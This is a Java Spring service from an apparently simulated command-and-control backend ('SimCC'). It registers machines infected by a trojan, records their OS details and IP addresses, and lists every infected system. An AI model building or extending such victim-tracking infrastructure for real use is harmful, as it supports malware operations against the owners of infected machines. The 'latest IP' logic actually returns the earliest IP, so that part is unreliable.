package at.simcc.simcc_backend.api.service;

import at.simcc.simcc_backend.api.body.InfectedRegistrationRequest;
import at.simcc.simcc_backend.entities.Infected;
import at.simcc.simcc_backend.entities.InfectedIP;
import at.simcc.simcc_backend.entities.Trojan;
import at.simcc.simcc_backend.mapper.InfectedMapper;
import at.simcc.simcc_backend.models.InfectedIdDto;
import at.simcc.simcc_backend.models.InfectedWithLatestIPDto;
import at.simcc.simcc_backend.repo.InfectedRepository;
import at.simcc.simcc_backend.repo.TrojanRepository;
import jakarta.persistence.EntityNotFoundException;
import lombok.RequiredArgsConstructor;
import org.springframework.stereotype.Service;

import java.net.Inet4Address;
import java.time.LocalDate;
import java.util.*;

/**
 * Project: SimCC-Backend
 * Created by: Georg Kollegger
 * Date: 4/10/26
 */
@Service
@RequiredArgsConstructor
public class InfectedService {
    private final InfectedRepository infectedRepo;
    private final TrojanRepository trojanRepository;
    private final InfectedRepository infectedRepository;

    private final InfectedMapper infectedMapper;

    /**
     * Register a new infected machine using a {@code ccid}
     * @param ccid a {@code ccid} used to check whether a valid trojan session is used
     * @throws EntityNotFoundException when the {@code ccid} was invalid
     */
    public Optional<InfectedIdDto> registerInfected(InfectedRegistrationRequest req, Optional<Inet4Address> ip) {
        Optional<Trojan> optTrojan = trojanRepository.findTrojanByCcid(req.ccid());

        if (optTrojan.isEmpty()) return Optional.empty();

        Infected infected = Infected.builder()
                .trojan(optTrojan.get())
                .osType(req.osType())
                .osVersion(req.osVersion())
                .osEdition(req.osEdition())
                .osCodeName(req.osCodeName())
                .osBits(req.osBits())
                .osArch(req.osArch())
                .build();

        infected.setInfectedIPS(
                ip.map(inet4Address -> List.of(
                        InfectedIP.builder()
                                .ip(inet4Address)
                                .since(LocalDate.now())
                                .infected(infected)
                                .build()
                )).orElseGet(List::of)
        );
        Infected saved = infectedRepository.save(
                infected
        );
        return Optional.of(infectedMapper.toDtoId(saved));
    }


    public Optional<Infected> getInfectedComplete(UUID iid) {
        List<Infected> infectedList =  infectedRepository.findFirstByIid(iid);
        if (infectedList.isEmpty()) {
            return Optional.empty();
        }
        return Optional.of(infectedList.getFirst());
    }

    /**
     * Returns all infected systems by our virus
     * @latestIpAddress -> the last used ip address
     */
    public List<InfectedWithLatestIPDto> getAllInfected() {
        List<Infected> infectends = infectedRepo.findAll();
        List<InfectedWithLatestIPDto> infectedDtos = new ArrayList<>();
        for (Infected infected : infectends){
            InfectedWithLatestIPDto infectedWithLatestIPDto
                    = infectedMapper.toInfectedWIthLatestIPDto(infected);

            infectedWithLatestIPDto.setLatestIpAddress(
                    infected.getInfectedIPS()
                            .stream()
                            .sorted(Comparator.comparing(InfectedIP::getSince))
                            .map(i -> i.getIp().getHostAddress())
                            .findFirst()
                            .orElse(null)
            );

            infectedDtos.add(
                    infectedWithLatestIPDto
            );
        }

        return infectedDtos;
    }
}
